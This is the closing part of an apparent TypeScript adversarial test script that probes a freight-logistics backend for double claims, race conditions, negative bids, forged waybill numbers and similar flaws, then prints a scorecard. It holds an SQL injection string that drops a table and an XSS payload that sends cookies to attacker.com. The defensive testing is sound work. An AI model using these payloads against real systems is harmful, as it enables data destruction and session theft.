    await service.claimCargoInsurance(authT1, String(insPolicy.id), {
      claimAmount: 40000,
      claimStatus: 'under_review',
      claimNotes: 'Legit initial claim',
    });
    try {
      await service.claimCargoInsurance(authT1, String(insPolicy.id), {
        claimAmount: 90000,
        claimStatus: 'filed',
        claimNotes: 'Rogue overwrite attack',
      });
      recordResult({
        campaign: 'CAMPAIGN 4',
        testId: 'ATTACK-4.3',
        name: 'Insurance Double-Claim Overwrite Attack',
        attackVector: 'Second claim call on already claimed policy',
        verdict: 'EXPLOIT_FOUND',
        severity: 'HIGH',
        expectedBehavior: 'Throws ALREADY_CLAIMED error',
        actualOutcome: 'Second claim silently overwrote the first claim!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 4',
        testId: 'ATTACK-4.3',
        name: 'Insurance Claim Immutability Guard',
        attackVector: 'Second claim call on already claimed policy',
        verdict: 'BLOCKED',
        severity: 'HIGH',
        expectedBehavior: 'Throws ALREADY_CLAIMED error',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // ========================================================================
    // CAMPAIGN 5: Bonded Warehouse Receipts Double-Release & Over-Draft
    // ========================================================================
    console.log('\n\x1b[1m\x1b[33m--- [CAMPAIGN 5] Bonded Warehouse Receipts Double-Release & Over-Draft ---\x1b[0m');

    const whReceipt = await service.createWarehouseReceipt(authT1, {
      jobId: String(legitJobT1.id),
      packageCount: 120,
      grossWeightKg: 15000,
      cbm: 45,
      bayRackBin: 'ZONE-C-RACK-04',
      notes: 'إيداع بالمستودع الجمركي المشترك',
    });

    await service.releaseWarehouseReceipt(authT1, String(whReceipt.id), {
      notes: 'إفراج جمركي وتسليم قانوني أولي',
    });

    // Attack 5.1: Double Release of the Same Warehouse Receipt
    try {
      await service.releaseWarehouseReceipt(authT1, String(whReceipt.id), {
        notes: 'Double release rogue attempt',
      });
      recordResult({
        campaign: 'CAMPAIGN 5',
        testId: 'ATTACK-5.1',
        name: 'Warehouse Receipt Double Release',
        attackVector: 'Invoking releaseWarehouseReceipt on already released receipt',
        verdict: 'EXPLOIT_FOUND',
        severity: 'CRITICAL',
        expectedBehavior: 'Throws BadRequestException: already released',
        actualOutcome: 'Warehouse receipt released twice! Phantom cargo dispatched!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 5',
        testId: 'ATTACK-5.1',
        name: 'Warehouse Receipt Double-Release Guard',
        attackVector: 'Invoking releaseWarehouseReceipt on already released receipt',
        verdict: 'BLOCKED',
        severity: 'CRITICAL',
        expectedBehavior: 'Throws BadRequestException: already released',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // ========================================================================
    // CAMPAIGN 6: Carrier Invoices & Freight Audit Tolerance Sabotage
    // ========================================================================
    console.log('\n\x1b[1m\x1b[33m--- [CAMPAIGN 6] Carrier Invoices & Freight Audit Tolerance Sabotage ---\x1b[0m');

    const testRateCard = await service.createRateCard(authT1, {
      polCode: 'CNSHA',
      podCode: 'EGALY',
      containerType: "40' HC",
      oceanFreight: 1200,
      thcOrigin: 150,
      thcDestination: 150,
      bafCharges: 0,
      otherCharges: 0,
      currency: 'USD',
      validFrom: '2026-01-01',
      validUntil: '2026-12-31',
    });

    // Attack 6.1: Carrier Overcharge Invoiced at $4,500 (300% variance)
    const auditResOver = calculateFreightAudit({
      invoicedTotal: 4500,
      invoicedCurrency: 'USD',
      oceanFreight: 4000,
      thcCharges: 500,
      rateCard: {
        id: testRateCard.id,
        totalFreightCost: 1500,
        currency: 'USD',
      },
      containerCount: 1,
    });

    if (auditResOver.auditStatus === 'overcharge' && auditResOver.recommendation === 'requires_override_or_dispute') {
      recordResult({
        campaign: 'CAMPAIGN 6',
        testId: 'ATTACK-6.1',
        name: 'Freight Audit Overcharge Radar',
        attackVector: 'Carrier invoices $4,500 against $1,500 contracted rate',
        verdict: 'BLOCKED',
        severity: 'HIGH',
        expectedBehavior: 'Flagged as overcharge, auto-approval rejected',
        actualOutcome: `Trapped! Status: ${auditResOver.auditStatus}, Variance: +${auditResOver.variancePct}% (${auditResOver.varianceAmount} USD). Recommendation: ${auditResOver.recommendation}`,
      });
    } else {
      recordResult({
        campaign: 'CAMPAIGN 6',
        testId: 'ATTACK-6.1',
        name: 'Freight Audit Overcharge Detection Failure',
        attackVector: 'Carrier invoices $4,500 against $1,500 contracted rate',
        verdict: 'EXPLOIT_FOUND',
        severity: 'HIGH',
        expectedBehavior: 'Flagged as overcharge, auto-approval rejected',
        actualOutcome: `Failed to flag overcharge! Status: ${auditResOver.auditStatus}`,
      });
    }

    // Attack 6.2: Multi-Currency Without Exchange Rate Sabotage
    const auditResFx = calculateFreightAudit({
      invoicedTotal: 75000,
      invoicedCurrency: 'EGP',
      rateCard: {
        id: testRateCard.id,
        totalFreightCost: 1500,
        currency: 'USD',
      },
      exchangeRate: 0,
    });

    if (auditResFx.auditStatus === 'currency_mismatch') {
      recordResult({
        campaign: 'CAMPAIGN 6',
        testId: 'ATTACK-6.2',
        name: 'Currency Mismatch Audit Trap',
        attackVector: 'Invoice in EGP, Rate card in USD, exchangeRate = 0',
        verdict: 'BLOCKED',
        severity: 'MEDIUM',
        expectedBehavior: 'Flagged as currency_mismatch to prevent comparing mismatched units',
        actualOutcome: `Trapped! Status: ${auditResFx.auditStatus}`,
      });
    } else {
      recordResult({
        campaign: 'CAMPAIGN 6',
        testId: 'ATTACK-6.2',
        name: 'Currency Mismatch Audit Failure',
        attackVector: 'Invoice in EGP, Rate card in USD, exchangeRate = 0',
        verdict: 'EXPLOIT_FOUND',
        severity: 'MEDIUM',
        expectedBehavior: 'Flagged as currency_mismatch',
        actualOutcome: `Mismatched currencies compared directly! Status: ${auditResFx.auditStatus}`,
      });
    }

    // ========================================================================
    // CAMPAIGN 7: Inquiries, RFQs & Bids Sabotage
    // ========================================================================
    console.log('\n\x1b[1m\x1b[33m--- [CAMPAIGN 7] Inquiries, RFQs & Bids Sabotage ---\x1b[0m');

    const testInquiry = await service.createInquiry(authT1, {
      customerId: Number(custT1.id),
      customerName: custT1.name,
      polCode: 'CNSHA',
      polName: 'Shanghai Port',
      podCode: 'EGALY',
      podName: 'Alexandria Port',
      containerType: "40' HC",
      containerCount: 2,
    });

    const convertedRfq = await service.convertInquiryToRfq(authT1, String(testInquiry.id));

    // Attack 7.1: Double-Conversion Replay Attack on Inquiry
    try {
      await service.convertInquiryToRfq(authT1, String(testInquiry.id));
      recordResult({
        campaign: 'CAMPAIGN 7',
        testId: 'ATTACK-7.1',
        name: 'Inquiry Double-Conversion Replay Attack',
        attackVector: 'Converting an already converted inquiry to RFQ a second time',
        verdict: 'EXPLOIT_FOUND',
        severity: 'MEDIUM',
        expectedBehavior: 'Throws BadRequestException: inquiry already converted',
        actualOutcome: 'Inquiry was converted to RFQ twice!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 7',
        testId: 'ATTACK-7.1',
        name: 'Inquiry Conversion Idempotency Guard',
        attackVector: 'Converting an already converted inquiry to RFQ a second time',
        verdict: 'BLOCKED',
        severity: 'MEDIUM',
        expectedBehavior: 'Throws BadRequestException: inquiry already converted',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // Attack 7.2: Submitting Negative Ocean Freight Bid (-$5,000)
    try {
      await service.submitBid(authT1, {
        rfqId: String(convertedRfq.id),
        shippingLineName: 'Maersk Line',
        oceanFreight: -5000,
        currency: 'USD',
        transitTimeDays: 22,
        freeDays: 14,
      });
      recordResult({
        campaign: 'CAMPAIGN 7',
        testId: 'ATTACK-7.2',
        name: 'Negative Ocean Freight Bid Injection',
        attackVector: 'Submitting carrier bid with oceanFreight = -5,000',
        verdict: 'EXPLOIT_FOUND',
        severity: 'HIGH',
        expectedBehavior: 'Throws BadRequestException: bid amounts must be positive',
        actualOutcome: 'Negative ocean freight bid recorded!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 7',
        testId: 'ATTACK-7.2',
        name: 'Negative Freight Bid Guard',
        attackVector: 'Submitting carrier bid with oceanFreight = -5,000',
        verdict: 'BLOCKED',
        severity: 'HIGH',
        expectedBehavior: 'Throws BadRequestException: bid amounts must be positive',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // ========================================================================
    // CAMPAIGN 8: Quotation Conversion & Job Spawning Concurrency Hammer
    // ========================================================================
    console.log('\n\x1b[1m\x1b[33m--- [CAMPAIGN 8] Quotation Conversion & Job Spawning Concurrency Hammer ---\x1b[0m');

    const testQuotation = await service.createQuotation(authT1, {
      customerId: Number(custT1.id),
      customerName: custT1.name,
      rfqId: String(convertedRfq.id),
      transportMode: 'sea',
      baseCost: 40000,
      marginType: 'fixed',
      marginValue: 10000,
      currency: 'EGP',
      paymentTerm: 'prepaid',
      notes: 'عرض سعر لاختبار التزامن والتحويل',
    });

    // Attack 8.1: 5 Rapid Concurrent autoConvertQuotationToJob calls
    console.log(
      '  [*] Launching 5 concurrent job conversion requests on quotation #' + testQuotation.quotation_number + '...',
    );
    await Promise.allSettled([
      service.autoConvertQuotationToJob(authT1, String(testQuotation.id)),
      service.autoConvertQuotationToJob(authT1, String(testQuotation.id)),
      service.autoConvertQuotationToJob(authT1, String(testQuotation.id)),
      service.autoConvertQuotationToJob(authT1, String(testQuotation.id)),
      service.autoConvertQuotationToJob(authT1, String(testQuotation.id)),
    ]);

    const createdJobs = await db
      .selectFrom('maritime_jobs')
      .selectAll()
      .where('tenant_id', '=', primaryTenantId)
      .where('quotation_id', '=', String(testQuotation.id))
      .execute();

    if (createdJobs.length > 1) {
      recordResult({
        campaign: 'CAMPAIGN 8',
        testId: 'ATTACK-8.1',
        name: 'Quotation Conversion Spawns Multiple Phantom Jobs',
        attackVector: '5 concurrent calls to autoConvertQuotationToJob on the same quotation',
        verdict: 'EXPLOIT_FOUND',
        severity: 'HIGH',
        expectedBehavior: 'Only 1 job created, quotation locked / marked converted',
        actualOutcome: `VULNERABILITY: ${createdJobs.length} duplicate jobs were spawned for the same quotation!`,
        notes: 'Needs idempotent state lock or transaction checking quotation status before job insertion.',
      });
    } else {
      recordResult({
        campaign: 'CAMPAIGN 8',
        testId: 'ATTACK-8.1',
        name: 'Quotation Conversion Idempotency Guard',
        attackVector: '5 concurrent calls to autoConvertQuotationToJob on the same quotation',
        verdict: 'BLOCKED',
        severity: 'HIGH',
        expectedBehavior: 'Only 1 job created',
        actualOutcome: `Safely locked! Exactly ${createdJobs.length} job was created.`,
      });
    }

    // ========================================================================
    // CAMPAIGN 9: Air Freight Modulo-7 & Surcharge Chaos
    // ========================================================================
    console.log('\n\x1b[1m\x1b[33m--- [CAMPAIGN 9] Air Freight Modulo-7 & Surcharge Chaos ---\x1b[0m');

    // Attack 9.1: Corrupt IATA AWB Check Digit (Modulo 7 violation)
    const awbCorrupt = validateIataAwbNumber('074-12345679');
    if (!awbCorrupt.valid) {
      recordResult({
        campaign: 'CAMPAIGN 9',
        testId: 'ATTACK-9.1',
        name: 'IATA Air Waybill Modulo-7 Fraud Resistance',
        attackVector: 'Air Waybill with broken check digit: 074-12345679',
        verdict: 'BLOCKED',
        severity: 'MEDIUM',
        expectedBehavior: 'IATA Modulo-7 validator flags invalid check digit',
        actualOutcome: `Blocked! Reason: ${awbCorrupt.error}`,
      });
    } else {
      recordResult({
        campaign: 'CAMPAIGN 9',
        testId: 'ATTACK-9.1',
        name: 'IATA AWB Check Digit Failure',
        attackVector: 'Air Waybill with broken check digit: 074-12345679',
        verdict: 'EXPLOIT_FOUND',
        severity: 'MEDIUM',
        expectedBehavior: 'IATA Modulo-7 validator flags invalid check digit',
        actualOutcome: 'Forged AWB number passed as valid!',
      });
    }

    // Attack 9.2: Negative Cargo Dimensions / Zero Packages in Air Freight
    try {
      calculateAirChargeableWeight({
        grossWeightKg: 500,
        dimensions: [{ lengthCm: -100, widthCm: 50, heightCm: 50, quantity: 1 }],
      });
      recordResult({
        campaign: 'CAMPAIGN 9',
        testId: 'ATTACK-9.2',
        name: 'Negative Air Cargo Dimensions Injection',
        attackVector: 'Negative dimension lengthCm = -100',
        verdict: 'EXPLOIT_FOUND',
        severity: 'MEDIUM',
        expectedBehavior: 'Throws error on negative dimensions',
        actualOutcome: 'Negative dimensions allowed in air volumetric calculation!',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 9',
        testId: 'ATTACK-9.2',
        name: 'Air Cargo Dimension Bounds Guard',
        attackVector: 'Negative dimension lengthCm = -100',
        verdict: 'BLOCKED',
        severity: 'MEDIUM',
        expectedBehavior: 'Throws error on negative dimensions',
        actualOutcome: `Blocked securely with: ${err.message}`,
      });
    }

    // ========================================================================
    // CAMPAIGN 10: Road Freight & Inland Trucking Overload Sabotage
    // ========================================================================
    console.log('\n\x1b[1m\x1b[33m--- [CAMPAIGN 10] Road Freight & Inland Trucking Overload Sabotage ---\x1b[0m');

    // Attack 10.1: Massive Overload on 26-Ton Curtainsider Truck (60,000 kg cargo)
    const truckSolve = calculateTrucksRequired({
      grossWeightKg: 60000,
      totalCbm: 120,
      palletCount: 50,
      preferredTruckType: 'curtainsider',
    });

    if (truckSolve.requiredTrucks >= 3) {
      recordResult({
        campaign: 'CAMPAIGN 10',
        testId: 'ATTACK-10.1',
        name: 'Truck Physical Weight Overload Constraint Solver',
        attackVector: '60 tons assigned to 26-ton curtainsider truck fleet',
        verdict: 'BLOCKED',
        severity: 'HIGH',
        expectedBehavior: 'Solver enforces physical capacity and splits into >= 3 trucks',
        actualOutcome: `Physical limit enforced! Solver calculated ${truckSolve.requiredTrucks} trucks required. Limiting factor: ${truckSolve.limitingFactor}`,
      });
    } else {
      recordResult({
        campaign: 'CAMPAIGN 10',
        testId: 'ATTACK-10.1',
        name: 'Truck Overload Uncaught',
        attackVector: '60 tons assigned to 26-ton curtainsider truck',
        verdict: 'EXPLOIT_FOUND',
        severity: 'HIGH',
        expectedBehavior: 'Solver enforces physical capacity',
        actualOutcome: `Dangerous overload: Solver accepted 60 tons on only ${truckSolve.requiredTrucks} trucks!`,
      });
    }

    // Attack 10.2: Forged CMR Overland Waybill Number
    const cmrForged = validateCmrWaybillNumber('INVALID_CMR_123');
    if (cmrForged.valid && !cmrForged.isInternationalCmr) {
      recordResult({
        campaign: 'CAMPAIGN 10',
        testId: 'ATTACK-10.2',
        name: 'Overland CMR Waybill International Flagging',
        attackVector: 'Waybill number: INVALID_CMR_123',
        verdict: 'BLOCKED',
        severity: 'MEDIUM',
        expectedBehavior: 'Does not grant international CMR status to non-CMR strings',
        actualOutcome: `Validated domestic: isInternationalCmr = false. Formatted: ${cmrForged.formattedWaybill}`,
      });
    } else if (!cmrForged.valid) {
      recordResult({
        campaign: 'CAMPAIGN 10',
        testId: 'ATTACK-10.2',
        name: 'Overland CMR Waybill Format Validation',
        attackVector: 'Invalid waybill number: INVALID_CMR_123',
        verdict: 'BLOCKED',
        severity: 'MEDIUM',
        expectedBehavior: 'Validates international CMR format',
        actualOutcome: `Trapped! Reason: ${cmrForged.error}`,
      });
    } else {
      recordResult({
        campaign: 'CAMPAIGN 10',
        testId: 'ATTACK-10.2',
        name: 'Invalid CMR Number Accepted',
        attackVector: 'Invalid waybill number: INVALID_CMR_123',
        verdict: 'EXPLOIT_FOUND',
        severity: 'MEDIUM',
        expectedBehavior: 'Validates international CMR format',
        actualOutcome: 'Invalid CMR accepted as international!',
      });
    }

    // ========================================================================
    // CAMPAIGN 11: SQL Injection, XSS, Overflow & Malformed Text Fuzzing
    // ========================================================================
    console.log('\n\x1b[1m\x1b[33m--- [CAMPAIGN 11] SQL Injection, XSS, Overflow & Malformed Text Fuzzing ---\x1b[0m');

    // Attack 11.1: SQL Injection in Container Number and Vessel Name
    const sqliPayload = "'; DROP TABLE maritime_jobs; --";
    try {
      const sqliContainer = await service.createContainer(authT1, {
        jobId: String(legitJobT1.id),
        containerNumber: sqliPayload,
        containerType: "20' GP",
      });
      await db.selectFrom('maritime_jobs').select('id').limit(1).execute();
      recordResult({
        campaign: 'CAMPAIGN 11',
        testId: 'ATTACK-11.1',
        name: 'SQL Injection in Container Number Parameterized',
        attackVector: `containerNumber = "${sqliPayload}"`,
        verdict: 'BLOCKED',
        severity: 'CRITICAL',
        expectedBehavior: 'Kysely parameterization prevents SQL execution; tables intact',
        actualOutcome: `Parameterized safely! Created container record #${sqliContainer.id}, database intact.`,
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 11',
        testId: 'ATTACK-11.1',
        name: 'SQL Injection Blocked by Validation',
        attackVector: `containerNumber = "${sqliPayload}"`,
        verdict: 'BLOCKED',
        severity: 'CRITICAL',
        expectedBehavior: 'Parameterized safely or rejected',
        actualOutcome: `Safely trapped: ${err.message}`,
      });
    }

    // Attack 11.2: XSS Injection in Job Milestones
    const xssPayload =
      '<script>fetch("http://attacker.com/steal?c=" + document.cookie)</script><img src=x onerror=alert(1)>';
    try {
      await service.addJobMilestone(
        authT1,
        String(legitJobT1.id),
        'DISC',
        xssPayload,
        '<b onmouseover=evil()>Alexandria</b>',
      );
      recordResult({
        campaign: 'CAMPAIGN 11',
        testId: 'ATTACK-11.2',
        name: 'XSS Payload in Milestone Sanitization / Storage',
        attackVector: `notes = "${xssPayload.substring(0, 30)}..."`,
        verdict: 'BLOCKED',
        severity: 'HIGH',
        expectedBehavior: 'Stored as text without executing; safe under React frontend JSX escaping',
        actualOutcome: 'Milestone recorded as raw text; frontend JSX protects rendering.',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 11',
        testId: 'ATTACK-11.2',
        name: 'XSS Milestone Guard',
        attackVector: `notes = "${xssPayload.substring(0, 30)}..."`,
        verdict: 'BLOCKED',
        severity: 'HIGH',
        expectedBehavior: 'Handled without server failure',
        actualOutcome: `Handled with: ${err.message}`,
      });
    }

    // Attack 11.3: Extreme Buffer Overflow (25,000 characters in shipment notes)
    const giantString = 'A'.repeat(25000);
    try {
      await service.updateJob(authT1, String(legitJobT1.id), { notes: giantString });
      recordResult({
        campaign: 'CAMPAIGN 11',
        testId: 'ATTACK-11.3',
        name: 'Buffer Overflow / Giant String in Shipment Notes',
        attackVector: '25,000 character string in notes field',
        verdict: 'BLOCKED',
        severity: 'LOW',
        expectedBehavior: 'Handled gracefully by PostgreSQL text column without crashing',
        actualOutcome: 'PostgreSQL text type accepted long string without server crash.',
      });
    } catch (err: any) {
      recordResult({
        campaign: 'CAMPAIGN 11',
        testId: 'ATTACK-11.3',
        name: 'Buffer Overflow Truncation / Validation',
        attackVector: '25,000 character string in notes field',
        verdict: 'BLOCKED',
        severity: 'LOW',
        expectedBehavior: 'Handled gracefully without crashing',
        actualOutcome: `Bounded safely with: ${err.message}`,
      });
    }

    // ========================================================================
    // CAMPAIGN 12: Universal Document Numbering Standard Integrity
    // ========================================================================
    console.log('\n\x1b[1m\x1b[33m--- [CAMPAIGN 12] Universal Document Numbering Standard Integrity ---\x1b[0m');

    const expectedJobPrefix = `JOB-${new Date().toISOString().slice(2, 4)}${new Date().toISOString().slice(5, 7)}${new Date().toISOString().slice(8, 10)}`;
    const jobNum = String(legitJobT1.job_number || '');
    const isStandardMatch = jobNum.startsWith(expectedJobPrefix);

    if (isStandardMatch) {
      recordResult({
        campaign: 'CAMPAIGN 12',
        testId: 'INVARIANT-12.1',
        name: 'Rule #10 Universal Document Numbering Compliance',
        attackVector: 'Verifying Job Number matches PREFIX-YYMMDD-XXXX format',
        verdict: 'BLOCKED',
        severity: 'INFO',
        expectedBehavior: `Number begins with ${expectedJobPrefix}-XXXX`,
        actualOutcome: `Compliant! Job number is: ${jobNum}`,
      });
    } else {
      recordResult({
        campaign: 'CAMPAIGN 12',
        testId: 'INVARIANT-12.1',
        name: 'Rule #10 Document Numbering Drift',
        attackVector: 'Verifying Job Number matches PREFIX-YYMMDD-XXXX format',
        verdict: 'EXPLOIT_FOUND',
        severity: 'LOW',
        expectedBehavior: `Number begins with ${expectedJobPrefix}-XXXX`,
        actualOutcome: `Non-compliant format: ${jobNum}`,
      });
    }
  } catch (uncaughtCampaignErr: any) {
    console.error(
      '\n❌ Uncaught error during campaign execution:',
      uncaughtCampaignErr?.message || uncaughtCampaignErr,
    );
  } finally {
    // Teardown & cleanup test artifacts
    console.log('\n\x1b[36m[*] Cleaning up isolated chaos test records from database...\x1b[0m');
    for (const tid of [primaryTenantId, attackerTenantId]) {
      await db
        .deleteFrom('maritime_containers')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('maritime_warehouse_receipts')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('maritime_cargo_insurances')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('maritime_job_charges')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('maritime_quotations')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('maritime_rfq_bids')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('maritime_rfqs')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('maritime_inquiries')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('maritime_jobs')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('maritime_rate_cards')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('customer_ledger')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('customers')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('journal_entry_lines')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('journal_entries')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('cost_centers')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('accounting_settings')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('currency_exchange_rates')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('accounting_accounts')
        .where('tenant_id', '=', tid)
        .execute()
        .catch(() => {});
      await db
        .deleteFrom('tenants')
        .where('id', '=', tid)
        .execute()
        .catch(() => {});
    }
    await pool.end().catch(() => {});
  }

  // ========================================================================
  // FINAL CHAOS SABOTEUR AUDIT SUMMARY REPORT
  // ========================================================================
  const totalAttacks = results.length;
  const blockedCount = results.filter((r) => r.verdict === 'BLOCKED').length;
  const exploitCount = results.filter((r) => r.verdict === 'EXPLOIT_FOUND').length;
  const crashCount = results.filter((r) => r.verdict === 'CRASH').length;
  const resilienceScore = ((blockedCount / totalAttacks) * 100).toFixed(1);

  console.log('\n' + '='.repeat(85));
  console.log('   📊  CHAOS SABOTEUR FINAL AUDIT EXECUTIVE SCORECARD  📊');
  console.log('='.repeat(85));
  console.log(`   Total Adversarial Vectors Executed: ${totalAttacks}`);
  console.log(`   🛡️  Attacks Successfully Blocked:    \x1b[32m${blockedCount}\x1b[0m`);
  console.log(`   ⚠️  Vulnerabilities / Gaps Exposed:  \x1b[33m${exploitCount}\x1b[0m`);
  console.log(`   ❌  Server Crashes / Uncaught 500:   \x1b[31m${crashCount}\x1b[0m`);
  console.log(`   🎯  System Resilience Score:         \x1b[1m\x1b[36m${resilienceScore}%\x1b[0m`);
  console.log('='.repeat(85) + '\n');

  if (exploitCount > 0) {
    console.log('\x1b[33m[!] ATTENTION: The following vulnerabilities or edge cases were discovered:\x1b[0m');
    results
      .filter((r) => r.verdict === 'EXPLOIT_FOUND')
      .forEach((r, idx) => {
        console.log(`  ${idx + 1}. [${r.severity}] ${r.testId}: ${r.name}`);
        console.log(`     - Vector:   ${r.attackVector}`);
        console.log(`     - Finding:  ${r.actualOutcome}`);
        if (r.notes) console.log(`     - Fix:      ${r.notes}`);
      });
  }

  console.log('\n>>> Chaos Test Execution Completed.\n');
  return {
    totalAttacks,
    blockedCount,
    exploitCount,
    crashCount,
    resilienceScore,
    results,
  };
}

runChaosSabotage().catch((err) => {
  console.error('\n❌ Unhandled Fatal Error in Chaos Runner:', err);
  process.exitCode = 1;
});
